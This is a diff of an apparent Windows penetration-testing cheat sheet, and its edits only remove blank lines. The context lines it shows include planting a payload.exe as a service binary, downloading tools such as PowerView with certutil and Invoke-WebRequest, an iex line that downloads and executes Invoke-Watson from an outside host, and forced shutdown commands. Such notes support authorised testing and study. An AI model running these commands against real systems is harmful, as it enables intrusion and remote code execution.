@@ -20,7 +20,6 @@ Import-Module .\PowerView.ps1
 ```powershell
 # copy files
 copy payload.exe "C:\Program Files\Service.exe"
-
 # copy directory name Tools to new directory "MyTools"
 xcopy Tools "C:\Users\Administrator\Desktop\MyTools" /E /I
 ```
@@ -38,10 +37,8 @@ ren Payload.exe Service.exe
 ```powershell
 # using certutil
 certutil -urlcache -split -f https://example.com/example.txt example.txt
-
 # using powershell Invoke-WebRequest
 iwr -Uri "http://172.16.8.1:9005/PowerView.ps1" -O "PowerView.ps1"
-
 # Download and Execute script
 iex ((New-Object Net.WebClient).DownloadString("http://172.16.8.1:9005/Invoke-Watson.ps1"))
 # or
@@ -68,7 +65,6 @@ iex $winpeas_ps1
 ```powershell
  # Shutdown now
  shutdown /s /t 0 /f
-
  # Restart
  shutdown /r /t 0 /f
 ```
